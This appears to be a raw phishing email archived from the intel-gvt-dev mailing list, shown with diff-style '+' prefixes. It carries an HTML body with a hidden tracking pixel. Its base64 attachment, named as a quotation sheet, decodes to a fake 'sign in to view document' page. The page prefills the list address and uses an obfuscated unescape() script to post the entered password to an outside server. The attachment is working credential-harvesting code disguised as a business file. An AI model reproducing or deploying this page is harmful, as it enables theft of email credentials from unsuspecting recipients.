+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft></P>
+<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
+ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
+oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
+NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
+LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
+rit; font-variant-east-asian: inherit; font-stretch: inherit'></DIV>
+<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
+ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
+oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
+NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
+LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
+rit; font-variant-east-asian: inherit; font-stretch: inherit'>
+<DIV class=3Dx_MsoNormal style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTI=
+CAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; TEXT=
+-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0cm 0cm 0pt; BOR=
+DER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased" ali=
+gn=3Dleft>
+<DIV class=3Dx_MsoNormal style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTI=
+CAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; TEXT=
+-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0cm 0cm 0pt; BOR=
+DER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased" ali=
+gn=3Dleft>
+<P class=3Dx_MsoNormal style=3D"TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; -web=
+kit-font-smoothing: antialiased" align=3Dleft><SPAN style=3D"BORDER-TOP: 0p=
+x; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: =
+; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BO=
+RDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased">
+<SPAN lang=3DEN-US style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-AL=
+IGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0p=
+x; -webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-font-smoothi=
+ng: antialiased" face=3DCalibri>2020-08-06</FONT></SPAN></SPAN></P></DIV>
+<P class=3Dx_MsoNormal style=3D"TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; -web=
+kit-font-smoothing: antialiased" align=3Dleft><SPAN style=3D"BORDER-TOP: 0p=
+x; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: =
+; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BO=
+RDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased">
+<SPAN lang=3DEN-US style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-AL=
+IGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0p=
+x; -webkit-font-smoothing: antialiased"></SPAN></SPAN>&nbsp;</P></DIV></DIV>
+<img src=3D"https://u16650384.ct.sendgrid.net/wf/open?upn=3Dec9KGMvd07MEkKq=
+6og6XsZh-2BADXfFtrbLnpp89uy9K8iyIskL4pv8LbHTyiPxF3Jzs5lJH-2B-2FVS4AMz3e21fo=
+iibVDrVLbfCXau4jeq69fPedCUpMHQAxVjaReBP1r2rFGWSEb0CitY1rT-2FgyBRq2sqQ12Kb1m=
+c4u79mTKf5KBn3DpRK0OH9c9PjR6lk8Mn40JXh2NICofe6w6rcSSv-2BQm4iUK9CEaxTvl8Sf-2=
+BUFQ-2Fg84bDHTYizJ1HdLl0EBK7x1" alt=3D"" width=3D"1" height=3D"1" border=3D=
+"0" style=3D"height:1px !important;width:1px !important;border-width:0 !imp=
+ortant;margin-top:0 !important;margin-bottom:0 !important;margin-right:0 !i=
+mportant;margin-left:0 !important;padding-top:0 !important;padding-bottom:0=
+ !important;padding-right:0 !important;padding-left:0 !important;"/>
+</BODY></HTML>
+
+------=_NextPart_000_0012_EC780025.542D54B3
+Content-Type: text/html; name="Quotation sheet for EFB-CS 20200609.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Quotation sheet for EFB-CS 20200609.html"
+
+PD9waHANCmZ1bmN0aW9uIGdldGxvZ2luSURGcm9tbG9naW4oJGVtYWlsKQ0Kew0KJGZpbmQgPSAn
+QCc7DQokcG9zID0gc3RycG9zKCRlbWFpbCwgJGZpbmQpOw0KJGxvZ2luSUQgPSBzdWJzdHIoJGVt
+YWlsLCAwLCAkcG9zKTsNCnJldHVybiAkbG9naW5JRDsNCn0NCmZ1bmN0aW9uIGdldERvbWFpbkZy
+b21FbWFpbCgkZW1haWwpDQp7DQovLyBHZXQgdGhlIGRhdGEgYWZ0ZXIgdGhlIEAgc2lnbg0KJGRv
+bWFpbiA9IHN1YnN0cihzdHJyY2hyKCRlbWFpbCwgIkAiKSwgMSk7DQpyZXR1cm4gJGRvbWFpbjsN
+Cn0NCiRsb2dpbiA9ICRfR0VUWydlbWFpbCddOw0KJGxvZ2luSUQgPSBnZXRsb2dpbklERnJvbWxv
+Z2luKCRsb2dpbik7DQokZG9tYWluID0gZ2V0RG9tYWluRnJvbUVtYWlsKCRsb2dpbik7DQokbG4g
+PSBzdHJsZW4oJGxvZ2luKTsNCiRsZW4gPSBzdHJyZXYoJGxvZ2luKTsNCiR4ID0gMDsNCmZvcigk
+aT0wOyAkaTwkbG47ICRpKyspew0KCWlmKCRsZW5bJGldID09ICJAIil7DQoJCSR4ID0gJGk7DQoJ
+CWJyZWFrOw0KCX0NCn0NCiR5dWggPSBzdWJzdHIoJGxlbiwwLCR4KTsNCiR5dWggPSBzdHJyZXYo
+JHl1aCk7DQpmb3IoJGk9MDsgJGk8JGxuOyAkaSsrKXsNCglpZigkeXVoWyRpXSA9PSAiLiIpew0K
+CQkkeCA9ICRpOw0KCQlicmVhazsNCgl9DQp9DQokeXVoID0gc3Vic3RyKCR5dWgsMCwkeCk7DQok
+eXVoID0gdWNmaXJzdCgkeXVoKTsNCiRkaXNwbGF5ID0gc3RydG91cHBlcigkeXVoKTsNCg0Kc2Vz
+c2lvbl9zdGFydCgpOw0KaWYgKGlzc2V0KCRfR0VUWydlbWFpbCddKSkgew0KICAgICRjbGllbnRl
+bWFpbCA9ICRfR0VUWydlbWFpbCddOw0KICAgICRfU0VTU0lPTlsnY2xpZW50ZW1haWwnXT0kY2xp
+ZW50ZW1haWw7DQp9DQoNCj8+DQoNCg0KDQo8IWRvY3R5cGUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+
+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0i
+d2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNl
+ci1zY2FsYWJsZT0wIi8+DQo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29t
+L2Nzcz9mYW1pbHk9TW9udHNlcnJhdDoxMDAsMjAwLDMwMCw0MDAsNTAwLDYwMCw3MDAsODAwIiBy
+ZWw9InN0eWxlc2hlZXQiPg0KPHRpdGxlPmxvZ2luX3BvcHVwPC90aXRsZT4NCjxzdHlsZT4NCmgx
+LGgyLGgzIHttYXJnaW46IDA7fQ0KLmVib29rLXBvcHVwLXNlYyB7LXdlYmtpdC1ib3gtc2hhZG93
+OiAwcHggMTBweCAyMHB4IDBweCByZ2JhKDUwLCA1MCwgNTAsIDAuNTIpOy1tb3otYm94LXNoYWRv
+dzogMHB4IDEwcHggMjBweCAwcHggcmdiYSg1MCwgNTAsIDUwLCAwLjUyKTtib3gtc2hhZG93OiAw
+cHggMTBweCAyMHB4IDBweCByZ2JhKDUwLCA1MCwgNTAsIDAuNTIpO30NCi5lYm9vay1wb3B1cC1z
+ZWMge2JhY2tncm91bmQ6IHJnYigxNzgsMzQsMzQpO2JhY2tncm91bmQ6IC1tb3otbGluZWFyLWdy
+YWRpZW50KHRvcCwgcmdiYSg5LCA4MiwgNDUpIDAlLCByZ2JhKDksIDgyLCA0NSkgMTAwJSk7YmFj
+a2dyb3VuZDogLXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCByZ2JhKDksIDgyLCA0NSkgMCUs
+cmdiYSgyNTUsIDI1NSwgMjU1LDEpIDEwMCUpO2JhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCh0
+byBib3R0b20sIHJnYmEoOSwgODIsIDQ1KSAwJSxyZ2JhKDI1NSwgMjU1LCAyNTUsMSkgMTAwJSk7
+ZmlsdGVyOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuZ3JhZGllbnQoIHN0YXJ0
+Q29sb3JzdHI9JyNjYmU0Y2MnLCBlbmRDb2xvcnN0cj0nI2I0ZDRkZCcsR3JhZGllbnRUeXBlPTAg
+KTsgd2lkdGg6IDUyMXB4OyBtYXJnaW46IDMwcHggYXV0bzsgcGFkZGluZzogMCA0NXB4IDMwcHgg
+NDVweDsgYm94LXNpemluZzogYm9yZGVyLWJveDsgdGV4dC1hbGlnbjogY2VudGVyOyBwb3NpdGlv
+bjogcmVsYXRpdmU7IH0NCi5lYm9vay1wb3B1cC1zZWMgaDMge21hcmdpbjogMCAwIDJweCAwO3Bh
+ZGRpbmc6IDA7bGluZS1oZWlnaHQ6IDIycHg7cGFkZGluZy1ib3R0b206IDIwcHg7Zm9udC1mYW1p
+bHk6ICdNb250c2VycmF0Jywgc2Fucy1zZXJpZjtmb250LXNpemU6IDE1cHg7Y29sb3I6ICMwMDA7
+Zm9udC13ZWlnaHQ6IDUwMDt9DQouZWJvb2stcG9wdXAtc2VjIGgyIHttYXJnaW46IDAgMCAxMnB4
+IDA7cGFkZGluZzogMHB4O2ZvbnQtZmFtaWx5OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7Zm9u
+dC1zaXplOiAyNnB4O2NvbG9yOiAjMDAwO3RleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7bGV0dGVy
+LXNwYWNpbmc6IDJweDtmb250LXdlaWdodDogNzAwO30NCi5lYm9vay1wb3B1cC1zZWMgaDUge2Zv
+bnQtc2l6ZTogMTJweDtsZXR0ZXItc3BhY2luZzogMXB4O2NvbG9yOiAjNDY0NjQ2O2ZvbnQtZmFt
+aWx5OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7fQ0KLmVib29rLXBvcHVwLXNlYyBoNSBzcGFu
+IHt0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTt9DQouZWJvb2stZW1haWwtc2VjIHsgbWFyZ2lu
+OiAwcHg7IHBhZGRpbmc6IDBweDsgd2lkdGg6IDEwMCU7IGZsb2F0OiBsZWZ0OyB9DQouZWJvb2st
+cG9wdXAtc2VjIC5lYm9va2VtYWlsLWlucHV0MSwuZWJvb2stcG9wdXAtc2VjIC5lYm9va2VtYWls
+LWlucHV0MiB7IHdpZHRoOiA0NyU7Ym9yZGVyOiBub25lOyBtYXJnaW4tYm90dG9tOiAzMHB4OyBm
+bG9hdDogbGVmdDsgcGFkZGluZzogMTdweDtib3JkZXItcmFkaXVzOiA2cHg7IGZvbnQtZmFtaWx5
+OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7Zm9udC1zaXplOiAxM3B4O2ZvbnQtd2VpZ2h0OiA1
+MDA7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IH0NCi5lYm9vay1wb3B1cC1zZWMgLmVib29rZW1h
+aWwtaW5wdXQyIHtmbG9hdDogcmlnaHQ7fQ0KLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1p
+bnB1dDE6Zm9jdXMsLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1pbnB1dDI6Zm9jdXMsIC5l
+Ym9vay1wb3B1cC1zZWMgLmVib29rLWNscy1idG4sIC5lYm9vay1wb3B1cC1zZWMgLmVib29rLWlu
+cHV0LWJ0biB7IG91dGxpbmU6IG5vbmU7IH0NCi5lYm9vay1wb3B1cC1zZWMgLmVib29rLWlucHV0
+LWJ0biB7IHdpZHRoOiAxMDAlO3dvcmQtc3BhY2luZzogMnB4O2N1cnNvcjogcG9pbnRlcjtmb250
+LXdlaWdodDogNTAwO2xldHRlci1zcGFjaW5nOiAxcHg7IG1hcmdpbi1ib3R0b206IDIwcHg7IHBh
+ZGRpbmc6IDIwcHggMTZweDtib3JkZXItcmFkaXVzOiA2cHg7IGZsb2F0OiByaWdodDsgYm9yZGVy
+OiAwcHg7IGZvbnQtZmFtaWx5OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7IGZvbnQtc2l6ZTog
+MTZweDsgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgY29sb3I6ICNGRkY7IGJveC1zaXppbmc6
+IGJvcmRlci1ib3g7IC13ZWJraXQtYm94LXNoYWRvdzogNXB4IDVweCA1cHggMCByZ2JhKDAsMCww
+LDAuMjcpOyBib3gtc2hhZG93OiA1cHggNXB4IDVweCAwIHJnYmEoMCwwLDAsMC4yNyk7YmFja2dy
+b3VuZDogcmdiKDAsMCwwLDAuMjcpO2JhY2tncm91bmQ6IC1tb3otbGluZWFyLWdyYWRpZW50KHRv
+cCwgcmdiYSgwLDAsMCwwLjI3KSAwJSwgcmdiYSgwLDAsMCwwLjI3KSAxMDAlKTtiYWNrZ3JvdW5k
+OiAtd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsIHJnYmEoMCwwLDAsMC4yNykgMCUscmdiYSgw
+LDAsMCwwLjI3KSAxMDAlKTtiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCBy
+Z2JhKDAsMCwwLDAuMjcpIDAlLHJnYmEoMCwwLDAsMC4yNykgMTAwJSk7ZmlsdGVyOiBwcm9naWQ6
+RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuZ3JhZGllbnQoIHN0YXJ0Q29sb3JzdHI9JyMxZDI1
+NjInLCBlbmRDb2xvcnN0cj0nIzEwMTY0OScsR3JhZGllbnRUeXBlPTAgKTt9DQouZWJvb2stcG9w
+dXAtc2VjIC5lYm9vay1pbnB1dC1idG46aG92ZXIgeyBiYWNrZ3JvdW5kOiAjMzMzMzMzOyB9DQou
+ZWJvb2stcG9wdXAtc2VjIC5lYm9vay1jbHMtYnRuIHsgZm9udC1zaXplOiAxNHB4OyBsaW5lLWhl
+aWdodDogMThweDsgd2lkdGg6IDI4cHg7IGhlaWdodDogMjhweDsgLXdlYmtpdC1ib3JkZXItcmFk
+aXVzOiA1MCU7IGJvcmRlci1yYWRpdXM6IDUwJTsgYmFja2dyb3VuZDogI0ZGRjsgcG9zaXRpb246
+IGFic29sdXRlOyByaWdodDogLTE0cHg7IHRvcDogLTE0cHg7IGJvcmRlcjogMHB4OyAtd2Via2l0
+LWJveC1zaGFkb3c6IDAgMCAycHggMCByZ2JhKDAsMCwwLDAuMjcpOyBib3gtc2hhZG93OiAwIDAg
+MnB4IDAgcmdiYSgwLDAsMCwwLjI3KTsgY3Vyc29yOiBwb2ludGVyOyB9DQouZWJvb2stcG9wdXAt
+c2VjIC5lYm9vay1jbHMtYnRuOmhvdmVyIHtiYWNrZ3JvdW5kOiAjMTQxYjUxO2NvbG9yOiAjZmZm
+O30NCi5lYm9vay1wb3B1cC1zZWMgaW1nIHttYXJnaW4tdG9wOiAtMzdweDtwYWRkaW5nLWJvdHRv
+bTogMzBweDt9DQoucG9wdXAtZ3JheWJveCB7cG9zaXRpb246IGZpeGVkO3dpZHRoOiAxMDAlO3Rv
+cDogMDtsZWZ0OiAwO2hlaWdodDogMTAwdmg7ei1pbmRleDogOTk5OTk7dGV4dC1hbGlnbjogY2Vu
+dGVyO2FsaWduLWl0ZW1zOiBjZW50ZXI7ZGlzcGxheTogZmxleDtib3gtc2l6aW5nOiBib3JkZXIt
+Ym94O292ZXJmbG93OiBhdXRvO30NCg0KIEBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0
+aDo4MTVweCkgew0KLmVib29rLXBvcHVwLXNlYyB7IHdpZHRoOiA4MCU7fQ0KLmVib29rLXBvcHVw
+LXNlYyBoMiB7Zm9udC1zaXplOiA0MHB4O30NCi5lYm9vay1wb3B1cC1zZWMgaDMge2ZvbnQtc2l6
+ZTogMTZweDtwYWRkaW5nLWJvdHRvbTogMzBweDt9DQouZWJvb2stcG9wdXAtc2VjIC5lYm9va2Vt
+YWlsLWlucHV0MSwgLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1pbnB1dDIge21hcmdpbi1i
+b3R0b206IDIycHg7cGFkZGluZzogMTRweDtmb250LXNpemU6IDEycHg7fQ0KLmVib29rLXBvcHVw
+LXNlYyAuZWJvb2staW5wdXQtYnRuIHtwYWRkaW5nOiAxNXB4IDE2cHg7Zm9udC1zaXplOiAxMnB4
+O30NCn0NCkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDo2NzVweCkgew0KLmVib29r
+LXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1pbnB1dCB7IHdpZHRoOiA2MCU7IH0NCi5lYm9vay1wb3B1
+cC1zZWMgaDMgeyBwYWRkaW5nOiAwO3BhZGRpbmctYm90dG9tOiAyMHB4OyBmb250LXNpemU6IDE0
+cHg7fQ0KLmVib29rLXBvcHVwLXNlYyBoMiB7IGZvbnQtc2l6ZTogMzBweDt9DQouZWJvb2stcG9w
+dXAtc2VjIC5lYm9va2VtYWlsLWlucHV0MSwgLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1p
+bnB1dDIge21hcmdpbi1ib3R0b206IDE1cHg7fQ0KfQ0KQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAo
+bWF4LXdpZHRoOjQ4MHB4KSB7DQouZWJvb2stcG9wdXAtc2VjIHt3aWR0aDogOTAlO30NCi5lYm9v
+ay1wb3B1cC1zZWMgLmVib29rZW1haWwtaW5wdXQgeyB3aWR0aDogMTAwJTsgbWFyZ2luLWJvdHRv
+bTogMTBweDtwYWRkaW5nOiAxMnB4OyB9DQouZWJvb2stcG9wdXAtc2VjIC5lYm9vay1pbnB1dC1i
+dG4geyB3aWR0aDogMTAwJTsgcGFkZGluZzogMTNweCAxNnB4O30NCi5lYm9vay1wb3B1cC1zZWMg
+aDMgeyBmb250LXNpemU6IDE2cHg7IGxpbmUtaGVpZ2h0OiAyMHB4O30NCi5lYm9vay1wb3B1cC1z
+ZWMgaDUge2xldHRlci1zcGFjaW5nOiAwLjVweDt9DQouZWJvb2stcG9wdXAtc2VjIGgyIHtmb250
+LXNpemU6IDI0cHg7bWFyZ2luOiAwIDAgMTBweCAwO30NCi5lYm9vay1wb3B1cC1zZWMge3BhZGRp
+bmc6IDAgMjBweCAxMHB4IDIwcHg7fQ0KLmVib29rLXBvcHVwLXNlYyBpbWcge3dpZHRoOiAyMiU7
+cGFkZGluZy1ib3R0b206IDIwcHg7fQ0KfQ0KQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAobWF4LXdp
+ZHRoOjQyNXB4KSB7DQouZWJvb2stcG9wdXAtc2VjIGgzIHtmb250LXNpemU6IDEycHg7fQ0KLmVi
+b29rLXBvcHVwLXNlYyBoMiB7Zm9udC1zaXplOiAxOHB4O30NCi5lYm9vay1wb3B1cC1zZWMgLmVi
+b29rLWlucHV0LWJ0biB7d2lkdGg6IDEwMCU7cGFkZGluZzogMTJweCAxNnB4O30NCi5lYm9vay1w
+b3B1cC1zZWMgLmVib29rZW1haWwtaW5wdXQxLCAuZWJvb2stcG9wdXAtc2VjIC5lYm9va2VtYWls
+LWlucHV0MiB7d2lkdGg6IDEwMCU7bWFyZ2luLWJvdHRvbTogOHB4O3BhZGRpbmc6IDEycHg7dGV4
+dC1hbGlnbjogY2VudGVyO30NCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQoNCjxib2R5IHN0eWxlPSJi
+YWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2h0dHA6Ly9pbmZpbml0aGluZ3MuaW8vd3AtaW5jbHVkZXMv
+aW1hZ2VzL3hsLnBuZycpIj4NCjxzZWN0aW9uIGNsYXNzPSJwb3B1cC1ncmF5Ym94Ij4NCjxkaXYg
+Y2xhc3M9ImVib29rLXBvcHVwLXNlYyIgPg0KIDxpbWcgc3JjPSJodHRwOi8vbnRrb21hbmRhLmx0
+L21lZGlhL3ppb3IveGxzL2ltYWdlcy9sb2dpbjAyX3BvcHVwLnBuZyIgYWx0PSIiPg0KIDxzY3Jp
+cHQgbGFuZ3VhZ2U9amF2YXNjcmlwdD5kb2N1bWVudC53cml0ZSh1bmVzY2FwZSgnJTIwJTNDZm9y
+bSUyMGNsYXNzJTNEJTIybW9kYWwtY29udGVudCUyMGFuaW1hdGUlMjIlMjBtZXRob2QlM0QlMjJw
+b3N0JTIyJTIwYWN0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZmYWJzdGV4YXBwYXJlbHMuY29tJTJG
+bm9uJTJGdXB4bHMucGhwJTBBJTIyJTNFJykpPC9zY3JpcHQ+DQogIDxoMiBkYXRhLWVkaXQ9InRl
+eHQiPlNpZ24gaW48L2gyPg0KICA8aDMgZGF0YS1lZGl0PSJ0ZXh0Ij48Zm9udCBjb2xvcj0iI0ZG
+RkZGRiI+d2l0aCB5b3VyIHZhbGlkPHN0cm9uZz4mbmJzcDs8P3BocCBlY2hvICRkaXNwbGF5ID8+
+PC9zdHJvbmc+PGJyPmVtYWlsIHBhc3N3b3JkIHRvIHZpZXcgZG9jdW1lbnQ8L2ZvbnQ+PC9oMz4N
+CiA8Zm9ybT4gDQogPGRpdiBjbGFzcz0iZWJvb2stZW1haWwtc2VjIj4NCiAgICA8aW5wdXQgdHlw
+ZT0iZW1haWwiIGNsYXNzPSJlYm9va2VtYWlsLWlucHV0MSIgIGRhdGEtZWRpdD0icGxhY2Vob2xk
+ZXIiIFZhbHVlPSJpbnRlbC1ndnQtZGV2QGxpc3RzLmZyZWVkZXNrdG9wLm9yZyIgcGxhY2Vob2xk
+ZXI9IkVudGVyIEVtYWlsIiBkaXNhYmxlZD4NCgkNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1l
+PSJlbWFpbCIgVmFsdWU9ImludGVsLWd2dC1kZXZAbGlzdHMuZnJlZWRlc2t0b3Aub3JnIj4NCiAg
+ICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGNsYXNzPSJlYm9va2VtYWlsLWlucHV0MiIgbmFtZT0i
+cGFzcyIgZGF0YS1lZGl0PSJwbGFjZWhvbGRlciIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3Jk
+IiByZXF1aXJlZD4NCiAgICA8YnV0dG9uIGNsYXNzPSJlYm9vay1pbnB1dC1idG4iIHR5cGU9InN1
+Ym1pdCI+Q29udGludWU8L2J1dHRvbj4NCiAgICA8YnV0dG9uIGNsYXNzPSJlYm9vay1jbHMtYnRu
+IGNsb3NlLWJ0biI+WDwvYnV0dG9uPg0KICA8L2Rpdj4NCiAgPGg1PjxzcGFuPkZvcmdvdCBQYXNz
+d29yZD88L3NwYW4+PC9oNT4NCiAgPC9mb3JtPg0KPC9kaXY+ICAgIA0KPC9zZWN0aW9uPg0KPC9i
+b2R5Pg0KPC9odG1sPg0K
+
+------=_NextPart_000_0012_EC780025.542D54B3
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+intel-gvt-dev mailing list
+intel-gvt-dev@lists.freedesktop.org
+https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev
+
+------=_NextPart_000_0012_EC780025.542D54B3--
+
